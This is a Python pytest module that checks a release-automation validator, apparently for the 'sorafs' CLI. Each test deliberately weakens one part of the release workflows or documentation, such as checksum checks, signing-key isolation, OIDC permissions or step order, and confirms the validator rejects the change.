    "provenance_file",
    [
        '"${candidate}/SHA256SUMS"',
        '"${candidate}/sorafs-release.spdx.json"',
        '"${candidate}/sorafs-release-vulnerabilities.sarif"',
        '"${candidate}/sorafs-cli-${target}.spdx.json"',
        '"${candidate}/sorafs-cli-${target}-vulnerabilities.sarif"',
    ],
)
def test_validate_release_automation_rejects_incomplete_provenance_file_inventory(
    tmp_path: Path,
    provenance_file: str,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    assert source.count(provenance_file) == 1
    workflow.write_text(
        source.replace(f"              {provenance_file}\n", "", 1),
        encoding="utf-8",
    )

    with pytest.raises(ValueError, match="exact checksum, archive, and scan files"):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    "marker",
    [
        "! -name '*.sigstore.json'",
        "signed candidate SHA256SUMS contains duplicate entries",
        "signed candidate SHA256SUMS does not cover the exact candidate file set",
    ],
)
def test_validate_release_automation_requires_signed_checksum_reconciliation(
    tmp_path: Path,
    marker: str,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    job_start = source.index("  reference-sdk-supply-chain-evidence:\n")
    job = source[job_start:]
    assert job.count(marker) == 1
    workflow.write_text(
        source[:job_start] + job.replace(marker, "REMOVED_CHECKSUM_GUARD", 1),
        encoding="utf-8",
    )

    with pytest.raises(ValueError, match="signed checksum manifest"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_unpinned_gh_verifier(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    original = '[[ "$actual_gh_sha256" != "$SORAFS_TRUSTED_GH_CLI_SHA256" ]]'
    assert original in source
    workflow.write_text(
        source.replace(original, '[[ "$actual_gh_sha256" == "" ]]', 1),
        encoding="utf-8",
    )

    with pytest.raises(ValueError, match="protected SHA-256"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_requires_independent_topology_key(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    original = (
        '[[ "$SORAFS_L1_TOPOLOGY_QUALIFICATION_VERIFICATION_PUBLIC_KEY_HEX" '
        '== "$SORAFS_PROVENANCE_VERIFICATION_PUBLIC_KEY_HEX" ]]'
    )
    assert original in source
    workflow.write_text(
        source.replace(
            original,
            '[[ "$SORAFS_L1_TOPOLOGY_QUALIFICATION_VERIFICATION_PUBLIC_KEY_HEX" == "" ]]',
            1,
        ),
        encoding="utf-8",
    )

    with pytest.raises(ValueError, match="independently administered"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_lexical_external_path_check(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    original = '[[ "$path" != "$path_real" ]]'
    assert source.count(original) == 2
    workflow.write_text(
        source.replace(original, '[[ "$path" == "" ]]'),
        encoding="utf-8",
    )

    with pytest.raises(ValueError, match="canonicalized before workspace exclusion"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_requires_replay_complete_source_upload(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    upload_line = "            sf11-source/\n"
    assert source.count(upload_line) == 1
    workflow.write_text(
        source.replace(
            upload_line,
            "            sf11-source/release-rehearsal.json\n",
            1,
        ),
        encoding="utf-8",
    )

    with pytest.raises(ValueError, match="complete replay source tree"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_source_job_oidc_authority(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    job_start = source.index("  reference-sdk-supply-chain-evidence:\n")
    job = source[job_start:]
    assert "    permissions:\n      contents: read\n" in job
    workflow.write_text(
        source[:job_start]
        + job.replace(
            "    permissions:\n      contents: read\n",
            "    permissions:\n      contents: read\n      id-token: write\n",
            1,
        ),
        encoding="utf-8",
    )

    with pytest.raises(ValueError, match="verification-only"):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    ("original", "replacement", "message"),
    [
        (
            "environment: sorafs-release-authentication",
            "environment: unprotected-release",
            "protected release-authentication environment",
        ),
        (
            "runs-on: [self-hosted, linux, x64, sorafs-release-auth]",
            "runs-on: ubuntu-latest",
            "protected self-hosted release-auth runner",
        ),
        (
            "SORAFS_TRUSTED_RELEASE_MANIFEST_VERIFIER_SHA256: "
            "${{ vars.SORAFS_TRUSTED_RELEASE_MANIFEST_VERIFIER_SHA256 }}",
            "SORAFS_TRUSTED_RELEASE_MANIFEST_VERIFIER_SHA256: ''",
            "missing an explicit protected public tuple",
        ),
    ],
)
def test_validate_release_automation_rejects_unprotected_auth_configuration(
    tmp_path: Path,
    original: str,
    replacement: str,
    message: str,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    assert original in source
    workflow.write_text(source.replace(original, replacement, 1), encoding="utf-8")
    with pytest.raises(ValueError, match=message):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_signing_in_auth_job(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    marker = "python3 scripts/release_manifest_signing.py verify"
    assert source.count(marker) == 2
    workflow.write_text(
        source.replace(
            marker,
            "python3 scripts/release_manifest_signing.py sign",
            1,
        ),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="verification-only"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_oidc_in_auth_job(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    anchor = (
        "  verify-release-auth:\n"
        "    if: ${{ startsWith(github.ref, 'refs/tags/sorafs-cli-v') "
        "|| inputs.sign_artifacts }}\n"
    )
    assert anchor in source
    workflow.write_text(
        source.replace(
            anchor,
            anchor + "    # id-token: write must never enter this job\n",
            1,
        ),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="OIDC and provenance authority"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_private_key_in_auth_job(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    anchor = (
        "    env:\n"
        "      SORAFS_RELEASE_SIGNATURE_PATH: "
        "${{ vars.SORAFS_RELEASE_SIGNATURE_PATH }}\n"
    )
    assert anchor in source
    workflow.write_text(
        source.replace(
            anchor,
            "    env:\n"
            "      SORAFS_RELEASE_PRIVATE_KEY_PATH: "
            "${{ vars.SORAFS_RELEASE_PRIVATE_KEY_PATH }}\n"
            "      SORAFS_RELEASE_SIGNATURE_PATH: "
            "${{ vars.SORAFS_RELEASE_SIGNATURE_PATH }}\n",
            1,
        ),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="must not receive private signing material"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_private_key_in_promotion_job(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    anchor = (
        "  sign:\n"
        "    if: ${{ startsWith(github.ref, 'refs/tags/sorafs-cli-v') "
        "|| inputs.sign_artifacts }}\n"
    )
    assert anchor in source
    workflow.write_text(
        source.replace(
            anchor,
            anchor
            + "    env:\n"
            + "      SORAFS_ED25519_PRIVATE_KEY_PATH: /run/forbidden.key\n",
            1,
        ),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="must not receive private signing material"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_promotion_candidate_binding_bypass(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    marker = "python3 scripts/generate_sorafs_cli_release_manifest.py check"
    assert source.count(marker) == 2
    second = source.index(marker, source.index(marker) + 1)
    workflow.write_text(
        source[:second] + marker.replace(" check", " create") + source[second + len(marker) :],
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="reconcile the downloaded authenticated manifest"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_requires_five_checksum_manifests(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    workflow.write_text(
        source.replace(
            '[[ "${#checksum_files[@]}" -ne 5 ]]',
            '[[ "${#checksum_files[@]}" -ne 4 ]]',
            1,
        ),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="missing contract marker"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_requires_native_host_smoke_builds(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    workflow.write_text(
        source.replace(
            'if [[ "$host_target" != "$target" ]]; then',
            'if [[ "$host_target" == "$target" ]]; then',
            1,
        ),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="missing contract marker"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_platform_scan_after_checksums(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    workflow.write_text(
        source.replace(
            "name: Scan platform binary SBOM",
            "name: Temporarily moved platform binary SBOM",
            1,
        ).replace(
            "name: Upload unsigned release candidate",
            "name: Scan platform binary SBOM\n      - name: Upload unsigned release candidate",
            1,
        ),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="out of order"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_archive_replay_after_checksums(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    workflow.write_text(
        source.replace(
            "name: Rebuild deterministic platform archive and run clean-consumer smoke",
            "name: Temporarily moved deterministic platform archive",
            1,
        ).replace(
            "name: Upload unsigned release candidate",
            "name: Rebuild deterministic platform archive and run clean-consumer smoke\n"
            "      - name: Upload unsigned release candidate",
            1,
        ),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="out of order"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_run_specific_scan_before_archive(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    archive_name = (
        "name: Rebuild deterministic platform archive and run clean-consumer smoke"
    )
    scan_name = "name: Stage source release scan evidence"
    workflow.write_text(
        source.replace(archive_name, "name: Temporary swap", 1)
        .replace(scan_name, archive_name, 1)
        .replace("name: Temporary swap", scan_name, 1),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="out of order"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_requires_two_candidate_builds(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    first = "python3 scripts/package_sorafs_cli_candidate.py"
    assert source.count(first) == 2
    workflow.write_text(
        source.replace(first, "python3 removed-packager.py", 1),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="built exactly twice"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_requires_two_reference_validator_builds(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    first = source.find("bash scripts/package_sorafs_validate_release.sh")
    second = source.find(
        "bash scripts/package_sorafs_validate_release.sh",
        first + 1,
    )
    assert first >= 0 and second > first
    workflow.write_text(
        source[:second]
        + "bash removed_reference_validator_packager.sh"
        + source[
            second + len("bash scripts/package_sorafs_validate_release.sh") :
        ],
        encoding="utf-8",
    )

    with pytest.raises(
        ValueError,
        match="reference-validator package must be built exactly twice",
    ):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    ("option", "message"),
    (
        (
            '--source-commit "$source_commit"',
            "both reference-validator package replays must bind the reviewed source commit",
        ),
        (
            '--source-date-epoch "$source_date_epoch"',
            "both reference-validator package replays must bind the canonical source epoch",
        ),
    ),
)
def test_validate_release_automation_requires_replayed_package_identity(
    tmp_path: Path,
    option: str,
    message: str,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    assert source.count(option) == 2
    workflow.write_text(source.replace(option, "REMOVED", 1), encoding="utf-8")

    with pytest.raises(ValueError, match=message):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_requires_archive_and_manifest_comparisons(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    replay_compare = 'cmp \\\n            "${first_out}/${package_name}'
    assert source.count(replay_compare) == 2
    workflow.write_text(
        source.replace(replay_compare, 'true \\\n            "${first_out}/${package_name}', 1),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="replay comparisons"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_reference_package_after_platform_sbom(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    workflow.write_text(
        source.replace(
            "name: Package reference validator and FFI header",
            "name: Temporarily moved reference validator package",
            1,
        ).replace(
            "name: Scan platform binary SBOM",
            "name: Package reference validator and FFI header\n"
            "      - name: Scan platform binary SBOM",
            1,
        ),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="out of order"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_checksum_verification_after_signing(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    source = workflow.read_text(encoding="utf-8")
    workflow.write_text(
        source.replace(
            "name: Verify platform package checksums before signing",
            "name: Temporarily moved checksum verification",
            1,
        ).replace(
            "name: Upload signed release candidate",
            "name: Verify platform package checksums before signing\n"
            "      - name: Upload signed release candidate",
            1,
        ),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="out of order"):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    ("relative", "marker"),
    [
        (
            "specs/sorafs/runbooks/index.md",
            "[Release rollback and yank](./release_rollback_yank.md)",
        ),
        (
            "specs/sorafs_release_pipeline_plan.md",
            "exactly the five expected target-triple checksum manifests",
        ),
        (
            "specs/sorafs/runbooks/release_rollback_yank.md",
            "`cargo yank --vers <version> <crate>`",
        ),
        (
            "specs/sorafs/runbooks/release_rollback_yank.md",
            "GitHub CLI artifacts",
        ),
        (
            "specs/sorafs/developer/releases.md",
            "all five native candidate archives",
        ),
        (
            "fixtures/documentation/sorafs_release_notes.md",
            "## Rollback / Yank Record",
        ),
    ],
)
def test_validate_release_automation_rejects_release_document_drift(
    tmp_path: Path, relative: str, marker: str
) -> None:
    _copy_workflows(tmp_path)
    document = tmp_path / relative
    source = document.read_text(encoding="utf-8")
    assert marker in source
    document.write_text(source.replace(marker, "removed", 1), encoding="utf-8")
    with pytest.raises(ValueError, match="release-document contract marker"):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    ("relative", "marker"),
    [
        (
            "scripts/examples/"
            "sorafs_reference_sdk_release_supply_chain_canary.args.example",
            "--supply-chain-source-root",
        ),
        (
            "scripts/examples/"
            "sorafs_reference_sdk_release_collection.args.example",
            "--provenance-certificate-identity",
        ),
        (
            "scripts/examples/"
            "sorafs_reference_sdk_release_evidence.args.example",
            "--provenance-verification-public-key-hex",
        ),
    ],
)
def test_validate_release_automation_rejects_stale_source_examples(
    tmp_path: Path,
    relative: str,
    marker: str,
) -> None:
    _copy_workflows(tmp_path)
    example = tmp_path / relative
    source = example.read_text(encoding="utf-8")
    assert marker in source
    example.write_text(
        source.replace(marker, "REMOVED_SOURCE_INPUT", 1),
        encoding="utf-8",
    )

    with pytest.raises(ValueError, match="missing source-bound example marker"):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    "retired",
    (
        "--target",
        "--sbom-index-digest-hex",
        "--vulnerability-report-digest-hex",
        "--provenance-bundle-digest-hex",
    ),
)
def test_validate_release_automation_rejects_retired_supply_chain_example_flags(
    tmp_path: Path,
    retired: str,
) -> None:
    _copy_workflows(tmp_path)
    relative = (
        "scripts/examples/"
        "sorafs_reference_sdk_release_supply_chain_canary.args.example"
    )
    example = tmp_path / relative
    example.write_text(
        example.read_text(encoding="utf-8") + f"{retired}\nretired-value\n",
        encoding="utf-8",
    )

    with pytest.raises(ValueError, match="retired manual supply-chain marker"):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    ("relative", "stale_claim"),
    [
        ("specs/sorafs_release_pipeline_plan.md", "via cross"),
        (
            "specs/sorafs_release_pipeline_plan.md",
            "exactly the three expected platform checksum manifests",
        ),
        (
            "specs/sorafs/developer/releases.md",
            "git tag -s sorafs-v",
        ),
        (
            "specs/sorafs/developer/releases.md",
            "invokes the script above",
        ),
    ],
)
def test_validate_release_automation_rejects_stale_release_document_claims(
    tmp_path: Path, relative: str, stale_claim: str
) -> None:
    _copy_workflows(tmp_path)
    document = tmp_path / relative
    document.write_text(
        document.read_text(encoding="utf-8") + f"\n{stale_claim}\n",
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="stale release-document claim"):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    ("stale_reference", "finding"),
    [
        (
            "sorafs_cli manifest sign --manifest manifest.to",
            "retired local manifest-authentication command",
        ),
        (
            "sorafs_cli manifest verify-signature --manifest manifest.to",
            "retired local manifest-authentication command",
        ),
        (
            "--identity-token-file=/run/release.jwt",
            "retired identity-token signing option",
        ),
        (
            "fixtures/sorafs_manifest/ci_sample/manifest.sig",
            "retired ci_sample authentication artifact",
        ),
        (
            "copy manifest.sign.summary.json into the release evidence",
            "retired local manifest-authentication artifact",
        ),
        (
            "openssl pkeyutl -sign -inkey release.pem -in manifest.json",
            "generic OpenSSL/RSA signing command",
        ),
        (
            "openssl dgst -sha256 -sign=release.pem manifest.json",
            "generic OpenSSL/RSA signing command",
        ),
        (
            "derive an Ed25519 signing key from the OIDC identity token",
            "OIDC-derived local Ed25519 signing material",
        ),
    ],
)
def test_validate_release_automation_rejects_retired_auth_across_document_tree(
    tmp_path: Path,
    stale_reference: str,
    finding: str,
) -> None:
    _copy_workflows(tmp_path)
    document = tmp_path / "docs/retired-release-auth.md"
    document.write_text(f"# Retired path\n\n{stale_reference}\n", encoding="utf-8")
    with pytest.raises(
        ValueError,
        match=rf"forbidden release-auth documentation reference \({finding}\)",
    ):
        automation.validate_release_automation(tmp_path)


def test_release_auth_document_discovery_rejects_symlinked_entries(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    target = tmp_path / "outside-release-auth.md"
    target.write_text("# External document\n", encoding="utf-8")
    (tmp_path / "docs/symlinked-release-auth.md").symlink_to(target)

    with pytest.raises(ValueError, match="must not contain symlinks"):
        automation.validate_release_automation(tmp_path)


def test_release_auth_document_discovery_ignores_generated_node_dependencies(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    generated = tmp_path / "tools/openapi/node_modules/package"
    generated.mkdir(parents=True)
    (generated / "stale-release-auth.md").write_text(
        "openssl pkeyutl -sign -inkey release.pem -in manifest.json\n",
        encoding="utf-8",
    )
    binary_dir = generated / ".bin"
    binary_dir.mkdir()
    (binary_dir / "tool").symlink_to(generated / "stale-release-auth.md")

    summary = automation.validate_release_automation(tmp_path)
    assert summary["workflow_count"] == len(automation.WORKFLOWS)


def test_release_auth_document_discovery_rejects_hard_linked_documents(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    target = tmp_path / "docs/release-auth-source.md"
    target.write_text("# Release authentication\n", encoding="utf-8")
    os.link(target, tmp_path / "docs/release-auth-alias.md")

    with pytest.raises(ValueError, match="must not be hard linked"):
        automation.validate_release_automation(tmp_path)


def test_release_auth_document_discovery_enforces_entry_budget(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _copy_workflows(tmp_path)
    for index in range(2):
        (tmp_path / "docs" / f"budget-{index}.md").write_text(
            "# Release-auth entry-budget fixture\n",
            encoding="utf-8",
        )
    monkeypatch.setattr(automation, "MAX_RELEASE_AUTH_TREE_ENTRIES", 1)

    with pytest.raises(ValueError, match="exceeds its entry limit"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_requires_historical_oidc_finding_remediation(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    relative = "specs/sorafs/reports/sf6_security_review.md"
    document = tmp_path / relative
    source = document.read_text(encoding="utf-8")
    marker = "Removed that CLI surface and all production callers"
    assert marker in source
    document.write_text(
        source.replace(marker, "Remediation pending", 1),
        encoding="utf-8",
    )
    with pytest.raises(
        ValueError,
        match="OIDC-derived local Ed25519 signing material",
    ):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize(
    ("injection", "message"),
    [
        (
            "openssl dgst -sha256 -sign release.pem dist/package.whl\n",
            "generic OpenSSL/RSA signing is forbidden",
        ),
        (
            '${OPENSSL_BIN} dgst -sha256 -sign release.pem dist/package.whl\n',
            "generic OpenSSL/RSA signing is forbidden",
        ),
        (
            "cosign sign-blob dist/package.whl\n",
            "signing/provenance marker",
        ),
        (
            "PYTHON_RELEASE_SIGNING_KEY=/run/private.pem\n",
            "signing/provenance marker",
        ),
    ],
)
def test_validate_release_automation_rejects_package_smoke_signers(
    tmp_path: Path,
    injection: str,
    message: str,
) -> None:
    _copy_workflows(tmp_path)
    smoke = tmp_path / automation.PACKAGE_RELEASE_SMOKE_SCRIPT
    smoke.write_text(
        smoke.read_text(encoding="utf-8") + f"\n{injection}",
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match=message):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_requires_external_auth_route_from_smoke(
    tmp_path: Path,
) -> None:
    _copy_workflows(tmp_path)
    smoke = tmp_path / automation.PACKAGE_RELEASE_SMOKE_SCRIPT
    source = smoke.read_text(encoding="utf-8")
    marker = "scripts/release_manifest_signing.py"
    assert marker in source
    smoke.write_text(source.replace(marker, "removed-auth-route", 1), encoding="utf-8")
    with pytest.raises(ValueError, match="missing package-smoke contract marker"):
        automation.validate_release_automation(tmp_path)


@pytest.mark.parametrize("permission", ["attestations: write", "artifact-metadata: write"])
def test_validate_release_automation_requires_job_scoped_attestation_permissions(
    tmp_path: Path, permission: str
) -> None:
    _copy_workflows(tmp_path)
    workflow = tmp_path / ".github/workflows/sorafs-cli-release.yml"
    workflow.write_text(
        workflow.read_text(encoding="utf-8").replace(f"      {permission}\n", "", 1),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="must request"):
        automation.validate_release_automation(tmp_path)


def test_validate_release_automation_rejects_symlinked_workflow(tmp_path: Path) -> None:
    _copy_workflows(tmp_path)
    relative = ".github/workflows/sorafs-orchestrator-sdk.yml"
    workflow = tmp_path / relative
    target = tmp_path / "workflow-target.yml"
    workflow.replace(target)
    workflow.symlink_to(target)
    with pytest.raises(ValueError, match="symlinks"):
        automation.validate_release_automation(tmp_path)


def test_main_emits_schema_closed_summary(capsys: pytest.CaptureFixture[str]) -> None:
    assert automation.main() == 0
    assert json.loads(capsys.readouterr().out) == automation.validate_release_automation(
        REPO_ROOT
    )


def test_cli_release_gate_runs_supply_chain_and_topology_adversarial_suites() -> None:
    """The strict release gate cannot omit SF-11 or topology adversarial tests."""

    source = (REPO_ROOT / "ci/check_sorafs_cli_release.sh").read_text(
        encoding="utf-8"
    )
    for relative in (
        "scripts/tests/build_sorafs_reference_sdk_supply_chain_sources_test.py",
        "scripts/tests/sorafs_reference_sdk_supply_chain_test.py",
        "scripts/tests/check_sorafs_rollout_gate_contract_test.py::test_pdp_provider_protocol_and_chain_repair_boundary_are_documented",
        "scripts/tests/sorafs_evidence_json_test.py",
        "scripts/tests/sorafs_response_args_test.py",
        "scripts/tests/sorafs_topology_qualification_test.py",
    ):
        assert source.count(relative) == 1


def test_release_workflow_script_dependencies_are_exactly_pinned() -> None:
    requirements = (REPO_ROOT / "scripts/requirements.txt").read_text(
        encoding="utf-8"
    ).splitlines()
    assert requirements == sorted(requirements)
    assert requirements == [
        "blake3==1.0.9",
        "jsonschema==4.26.0",
        "pytest==9.0.3",
        "requests==2.33.0",
        'tomli==2.4.1; python_version < "3.11"',
        "tomli_w==1.2.0",
    ]
    dependabot = (REPO_ROOT / ".github/dependabot.yml").read_text(encoding="utf-8")
    assert 'package-ecosystem: "pip"' in dependabot
    assert "      - /scripts" in dependabot
